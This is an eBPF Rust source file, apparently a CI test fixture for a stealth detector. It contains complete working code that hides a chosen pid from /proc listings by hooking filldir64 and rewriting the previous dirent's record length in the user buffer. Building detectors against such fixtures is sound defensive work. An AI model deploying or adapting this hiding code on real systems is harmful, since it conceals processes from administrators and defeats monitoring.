// SPDX-FileCopyrightText: 2025-2026 rezky_nightky (oxyzenQ)
// SPDX-License-Identifier: AGPL-3.0-only OR Commercial
//
//! The Z11 detonation fixture's BPF side (night-frontier-Z11, phase
//! c, D8). NOT production code - a test fixture that lives only in
//! the project's own CI micro-VM (the kernel-floor lane's 5.15
//! kernel) and the operator's own detonation run, planted for one
//! purpose: prove the recorded-pid compare catches a real stealth
//! mechanism instead of a mocked one.
//!
//! The mechanism it demonstrates is the classic directory-listing
//! hide: an fentry program on `filldir64` - the per-entry callback
//! every getdents64 call drives - that removes ONE pid's entry from
//! the batch. The kernel hands the program the entry's own facts as
//! arguments (the container cursor, the name, its length), so there
//! is NO batch walk: the first shape walked the returned buffer
//! entry by entry with a probe-read stride, and the verifier
//! refused it on BOTH kernels the lanes run - the 5.15 floor died
//! in the state-line flood that walked verification generated (the
//! load's own log write failed, the verdict surfacing as EFAULT
//! over a verification that never finished), and 6.18 blew the
//! complexity limit outright (E2BIG). One parse per filldir call
//! carries no loop over unknown strides, so the verifier converges
//! on both.
//!
//! The hide is still the `d_reclen` absorb: the PREVIOUS entry's
//! record length - the container's `prev_reclen`, read before the
//! kernel writes this entry - grows to swallow the entry about to
//! be written, so the userspace iterator - which walks
//! `offset += d_reclen` - lands past it and never sees the pid. No
//! memmove, no retval rewrite: one bounded write, every bound
//! explicit.
//!
//! WHY A FIXTURE AND NOT A MOCK: a mocked listing would prove the
//! renderer, not the detector. The camera must record the hidden
//! process's action (the write probe sees it - hiding from the
//! directory listing does not hide from the kprobe), the direct
//! /proc/<pid> lookup must still resolve the pid (the stealth
//! filters the enumeration, not the lookup), and the listing must
//! omit it. All three facts are live kernel facts on a real kernel,
//! and the CI log is the proof.
//!
//! THE BOUNDARY, NAMED: this fixture hides one pid chosen by the
//! loader that plants it, inside a disposable micro-VM, for the
//! length of one test. It is the detector's own proving ground - the
//! same discipline the sandbox lanes carry (plant, observe, remove,
//! report).

#![no_std]
#![no_main]

use aya_ebpf::{
    helpers::{bpf_probe_read_kernel_buf, bpf_probe_write_user},
    macros::{fentry, map},
    maps::Array,
    programs::FEntryContext,
};
use core::sync::atomic::{AtomicU64, Ordering};

/// The fixture's control slot and its census counters: slot 0 is the
/// pid to hide (0 = inert - the loader writes the marker's pid before
/// attaching, an estate left behind by a crashed run hides nobody),
/// slots 1..5 are the counters the loader's census line reads back:
/// the fires, the failed probe reads, the name matches, the writes
/// that landed, the writes the kernel refused. Slots 6 and 7 carry
/// the container's field offsets, resolved from the host's own BTF
/// by the loader before the attach; slots 8 and 9 name the two skips
/// a hide can die of without reaching the write - a batch-leading
/// entry (no predecessor to absorb into) and an absorb that would
/// overflow the u16 record length. A hide that does not land names
/// its stage, never a guess.
#[map(name = "targets")]
static TARGETS: Array<u64> = Array::with_max_entries(10, 0);

/// The container offsets ride the host's own BTF, not constants:
/// upstream hoisted the user-buffer budget into `dir_context` itself
/// (6.x's filldir64 spends `ctx->count`), so the container's fields
/// after the embedded context sat 8 bytes higher than the 5.15 floor
/// carried them - and the first shape's hardcoded span read the
/// budget where the cursor belonged and half a user pointer where
/// the predecessor's length belonged. The parse matched, the absorb
/// overflowed its u16 bound, and the skip returned WITHOUT a counter:
/// the census said eighteen matches, zero writes, and no stage named.
/// The loader now resolves `current_dir` and `prev_reclen` from the
/// host's BTF (the same lesson the camera's offsets map carries) and
/// writes the byte offsets into slots 6 and 7 before the attach; a
/// kernel that moved or renamed the fields is refused by name in the
/// loader, and the program keeps the zero offsets inert. The mask
/// bounds the map-loaded scalar for the verifier: the loader validated
/// the offset against the same bound, and a probe read at a masked
/// offset cannot walk the pointer math out of range.
const OFFSET_BOUND: u64 = 0xff;
/// The dirent64 header the absorb formula rides on: d_ino (8) at 0,
/// d_off (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at
/// 19 - the kernel's own `ALIGN(offsetof(linux_dirent64, d_name) +
/// namlen + 1, 8)`.
const DIRENT_HEADER: usize = 19;
/// The name bytes one parse step may read: a pid's decimal form is
/// at most seven digits at the default pid_max (4.2M); eight is
/// generous, and the parse stops at the first non-digit anyway.
const NAME_DIGITS_MAX: usize = 8;

/// The fentry program on the getdents64 callback. The callback's
/// BTF declares six arguments - the container's dir_context, the
/// name, its length, the d_off, the inode, and the type - and the
/// program reads the first three: slot 0 is the container (its
/// `ctx` field is the struct's own first member), slot 1 the name,
/// slot 2 the length. The syscall's buffer facts ride inside the
/// container and are read through kernel probe reads, never through
/// context slots the callback does not declare.
#[fentry(function = "filldir64")]
pub fn pidhide(ctx: FEntryContext) -> i32 {
    // The fixture contract: a refusal inside the parse is named by
    // the loader's own diagnostics - the program returns 0 (observe
    // only), never an error the caller would surface.
    match try_pidhide(&ctx) {
        Ok(rc) => rc,
        Err(_) => 0,
    }
}

/// The census counter: one fetch-add per stage, the facts the
/// loader's census line names back.
fn bump(slot: u32) {
    if let Some(ptr) = TARGETS.get_ptr(slot) {
        let cell = unsafe { &*((ptr as *mut u64).cast::<AtomicU64>()) };
        cell.fetch_add(1, Ordering::Relaxed);
    }
}

/// The hide: parse the entry name's leading decimal digits, compare
/// them to the target pid, and grow the predecessor's record length
/// by the entry about to be written. Returns 1 when a pid was
/// hidden, 0 when this entry had nothing to hide - the loader
/// prints which.
fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
    // SAFETY: the callback's BTF declares the container pointer, the
    // name, and the length as its first three arguments; the name is
    // kernel memory (the dentry's own name) and the container rides
    // the kernel stack, so both ride kernel probe reads. The one
    // write lands in the user buffer the syscall is about to return,
    // bounded by the u16 field the length lives in. One block
    // carries the whole hide - edition 2024 wants the unsafe ops
    // explicit, and this is where they all live.
    unsafe {
        bump(1);
        let container: i64 = ctx.arg(0);
        if container == 0 {
            return Ok(0);
        }
        let namlen: i32 = ctx.arg(2);
        if namlen < 1 {
            return Ok(0);
        }
        let target = match TARGETS.get(0) {
            Some(0) | None => return Ok(0),
            // The target rides the slot's own u64 - the u32 truncation
            // the first shape rode forces the 5.15 verifier's precision
            // backtracking through a partially-tracked stack slot at the
            // walk's door (the machine-named EFAULT at the walk's first
            // step), and a pid fits the u64 compare exactly as well.
            Some(pid) => *pid,
        };

        // The container's field offsets, resolved from the host's own
        // BTF by the loader. Zero offsets mean the loader could not
        // resolve them and planted the estate anyway - inert, the
        // observe-only contract (the loader refuses by name first;
        // this is the belt under the braces).
        let cursor_off = match TARGETS.get(6) {
            Some(0) | None => return Ok(0),
            Some(off) => (*off & OFFSET_BOUND) as usize,
        };
        let prev_off = match TARGETS.get(7) {
            Some(0) | None => return Ok(0),
            Some(off) => (*off & OFFSET_BOUND) as usize,
        };

        // The container's own cursor: where this entry is about to be
        // written, and the predecessor's record length. prev_reclen 0
        // means this entry leads the batch - no predecessor to absorb
        // into, and the skip NAMES the stage (the loader's batch is
        // large enough that the marker's entry practically never
        // leads).
        let mut cursor_bytes = [0u8; 8];
        if bpf_probe_read_kernel_buf(
            (container as usize as *const u8).add(cursor_off),
            &mut cursor_bytes,
        )
        .is_err()
        {
            bump(2);
            return Err(1i32);
        }
        let mut prev_bytes = [0u8; 4];
        if bpf_probe_read_kernel_buf(
            (container as usize as *const u8).add(prev_off),
            &mut prev_bytes,
        )
        .is_err()
        {
            bump(2);
            return Err(1i32);
        }
        let cursor = u64::from_le_bytes(cursor_bytes) as usize;
        let prev_reclen = u32::from_le_bytes(prev_bytes) as usize;
        if cursor == 0 || prev_reclen == 0 {
            bump(8);
            return Ok(0);
        }

        // The name parse: the entry's leading decimal digits, one
        // parse per filldir call - no batch walk, no unknown strides.
        // A name that is not a decimal pid (the root's own "." / "..",
        // the non-numeric files, the names of other directories'
        // listings this callback also serves) reads as a mismatch.
        let name_ptr: i64 = ctx.arg(1);
        if name_ptr == 0 {
            return Ok(0);
        }
        let mut name = [0u8; NAME_DIGITS_MAX];
        if bpf_probe_read_kernel_buf(name_ptr as usize as *const u8, &mut name).is_err() {
            bump(2);
            return Err(1i32);
        }
        let mut value: u64 = 0;
        let mut digits = 0usize;
        let mut index = 0usize;
        while index < NAME_DIGITS_MAX {
            let byte = name[index];
            if byte < b'0' || byte > b'9' {
                break;
            }
            value = value.wrapping_mul(10).wrapping_add((byte - b'0') as u64);
            digits += 1;
            index += 1;
        }
        if digits == 0 || value != target {
            return Ok(0);
        }
        bump(3);

        // The absorb: the predecessor's d_reclen grows by the hidden
        // entry's length - the kernel's own formula
        // ALIGN(offsetof(linux_dirent64, d_name) + namlen + 1, 8) - so
        // the userspace iterator (offset += d_reclen) lands past the
        // hidden pid. One two-byte write into the user buffer, before
        // the kernel writes this entry: the fentry runs first, so the
        // hide is in place before the batch ever returns.
        let reclen = (namlen as usize + DIRENT_HEADER + 1 + 7) & !7usize;
        let grown = prev_reclen.wrapping_add(reclen);
        if grown > u16::MAX as usize {
            // The stage this gate ate silently once: a wrong offset
            // rode a garbage predecessor length through the parse and
            // the overflow refused the absorb with no counter at all.
            // Named now - the census says where a hide died.
            bump(9);
            return Ok(0);
        }
        let value16: u16 = grown as u16;
        if bpf_probe_write_user(
            (cursor - prev_reclen + 16) as *mut u16,
            &value16,
        )
        .is_err()
        {
            bump(5);
            return Err(1i32);
        }
        bump(4);
        Ok(1)
    }
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
